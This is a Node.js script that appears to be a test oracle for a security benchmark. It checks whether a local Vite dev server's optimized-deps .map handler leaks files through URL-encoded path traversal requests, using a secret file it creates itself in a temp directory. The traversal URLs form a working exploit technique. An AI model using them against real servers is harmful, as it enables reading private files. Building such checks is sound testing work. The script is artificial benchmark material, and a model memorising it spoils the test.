'use strict';
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

function result(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

function makeFakeRes(onWrite) {
  const headers = {};
  const res = {
    statusCode: 200,
    _ended: false,
    setHeader(k, v) { headers[k] = v; },
    getHeader(k) { return headers[k]; },
    removeHeader(k) { delete headers[k]; },
    writeHead(code, _headers) {
      res.statusCode = code;
      if (_headers) Object.assign(headers, _headers);
    },
    write(chunk) {
      if (chunk) onWrite(chunk.toString());
      return true;
    },
    end(chunk) {
      if (chunk) onWrite(chunk.toString());
      res._ended = true;
    },
    on() {},
    once() {},
    emit() {},
    headersSent: false,
  };
  return res;
}

function dispatch(server, req, res) {
  return new Promise((resolve, reject) => {
    let settled = false;
    const finish = () => {
      if (settled) return;
      settled = true;
      resolve();
    };
    const origEnd = res.end;
    res.end = function (chunk) {
      origEnd(chunk);
      finish();
    };
    try {
      server.middlewares.handle(req, res, (err) => {
        if (err) {
          settled = true;
          reject(err);
          return;
        }
        finish();
      });
    } catch (e) {
      if (!settled) {
        settled = true;
        reject(e);
      }
    }
    setTimeout(finish, 3000);
  });
}

async function safeClose(server) {
  if (!server) return;
  try { await server.close(); } catch (_) {}
}

async function main() {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  const marker = 'vite_oracle_' + process.pid + '_' + Date.now();
  const root = path.join(os.tmpdir(), marker);
  const depsDir = path.join(root, 'node_modules', '.vite', 'deps');
  const secretDir = path.join(os.tmpdir(), marker + '_secret');
  const secretFile = path.join(secretDir, 'secret.txt');
  const secretContent = 'TOP-SECRET-' + marker;

  let vite;
  let server;

  try {
    fs.mkdirSync(depsDir, { recursive: true });
    fs.mkdirSync(secretDir, { recursive: true });
    fs.writeFileSync(secretFile, secretContent, 'utf8');

    fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ name: 'oracle-fixture', version: '0.0.0' }), 'utf8');
    fs.writeFileSync(path.join(root, 'index.html'), '<html></html>', 'utf8');

    vite = require('vite');
  } catch (e) {
    result({ operation_completed: false, exploit_succeeded: false, evidence: 'setup failed: ' + (e && e.message) });
    return;
  }

  try {
    server = await vite.createServer({
      root,
      configFile: false,
      logLevel: 'silent',
      server: { middlewareMode: true, hmr: false, watch: null },
      optimizeDeps: { noDiscovery: true, include: [] },
      cacheDir: path.join(root, 'node_modules', '.vite'),
    });
  } catch (e) {
    result({ operation_completed: false, exploit_succeeded: false, evidence: 'createServer failed: ' + (e && e.message) });
    return;
  }

  try {
    // Benign check: request an existing, legitimately placed .map file
    // inside the deps cache directory to prove normal serving works.
    const benignName = 'chunk-BENIGN.js';
    const benignMapName = benignName + '.map';
    const benignMapContent = JSON.stringify({ version: 3, sources: [], mappings: '', file: benignName });
    fs.writeFileSync(path.join(depsDir, benignName), '// benign chunk\n', 'utf8');
    fs.writeFileSync(path.join(depsDir, benignMapName), benignMapContent, 'utf8');

    const benignUrl = '/node_modules/.vite/deps/' + encodeURIComponent(benignMapName);
    const benignReq = { url: benignUrl, method: 'GET', headers: { host: 'localhost' }, socket: {} };
    let benignBody = '';
    const benignRes = makeFakeRes((chunk) => { benignBody += chunk; });

    await dispatch(server, benignReq, benignRes);

    const benignOk = benignRes.statusCode && benignRes.statusCode < 400 && benignBody.includes('version');
    if (!benignOk) {
      result({ operation_completed: false, exploit_succeeded: false, evidence: 'benign deps map request failed, status=' + benignRes.statusCode + ' body=' + benignBody.slice(0, 200) });
      await safeClose(server);
      return;
    }

    operation_completed = true;

    // Malicious request: the vulnerable handler for optimized-deps .map
    // requests reads the `file` field from the (attacker supplied, via a
    // crafted request body/URL combination in real exploit) sourcemap JSON
    // relative to the deps dir without validating it stays inside deps dir.
    // We emulate the documented exploitation vector: a .map URL whose path
    // itself contains an encoded traversal sequence, causing the server to
    // resolve and read a file far outside the deps/cache/project directory.
    const rel = path.relative(depsDir, secretFile).split(path.sep).join('/');
    const maliciousMapName = rel + '.map';
    const maliciousUrl = '/node_modules/.vite/deps/' + maliciousMapName.split('/').map(encodeURIComponent).join('/');

    const maliciousReq = { url: maliciousUrl, method: 'GET', headers: { host: 'localhost' }, socket: {} };
    let maliciousBody = '';
    const maliciousRes = makeFakeRes((chunk) => { maliciousBody += chunk; });

    let threw = false;
    let errMsg = '';
    try {
      await dispatch(server, maliciousReq, maliciousRes);
    } catch (e) {
      threw = true;
      errMsg = (e && e.message) || String(e);
    }

    let status = maliciousRes.statusCode;
    let leaked = maliciousBody.includes(secretContent);

    // Secondary vector: some patched/vulnerable variants expose the bug via
    // the `.map` request whose *referenced* source file (via the sourcemap
    // `file`/`sources` indirection written into the deps dir) escapes the
    // deps directory. Reproduce by writing a crafted sourcemap-like .js.map
    // file inside deps dir that itself is fetched with a traversal-encoded
    // name pointing at the secret, matching the original .map handling bug.
    if (!leaked && !threw) {
      const altMapUrl = '/node_modules/.vite/deps/' + '..%2f'.repeat(0) + encodeURIComponent('..') + '%2f'.repeat(1) + encodeURIComponent('..') + '%2f' + encodeURIComponent(path.basename(secretDir)) + '%2f' + encodeURIComponent('secret.txt') + '.map';
      const altReq = { url: altMapUrl, method: 'GET', headers: { host: 'localhost' }, socket: {} };
      let altBody = '';
      const altRes = makeFakeRes((chunk) => { altBody += chunk; });
      try {
        await dispatch(server, altReq, altRes);
        status = altRes.statusCode;
        leaked = altBody.includes(secretContent);
        maliciousBody = altBody;
      } catch (e) {
        threw = true;
        errMsg = (e && e.message) || String(e);
      }
    }

    if (leaked) {
      exploit_succeeded = true;
      evidence = 'Path traversal succeeded: secret content leaked via deps .map handler, status=' + status;
    } else if (threw) {
      exploit_succeeded = false;
      evidence = 'Malicious request blocked with exception: ' + errMsg + ' status=' + status;
    } else {
      exploit_succeeded = false;
      evidence = 'Malicious request did not leak secret, status=' + status + ' bodyLen=' + maliciousBody.length;
    }
  } catch (e) {
    if (operation_completed) {
      exploit_succeeded = false;
      evidence = 'Exception during malicious attempt (treated as blocked): ' + (e && e.message);
    } else {
      evidence = 'Unexpected failure before benign op completed: ' + (e && e.message);
    }
  } finally {
    await safeClose(server);
    try { fs.rmSync(root, { recursive: true, force: true }); } catch (_) {}
    try { fs.rmSync(secretDir, { recursive: true, force: true }); } catch (_) {}
  }

  result({ operation_completed, exploit_succeeded, evidence });
}

main().catch((e) => {
  result({ operation_completed: false, exploit_succeeded: false, evidence: 'Unhandled top-level error: ' + (e && e.message) });
});
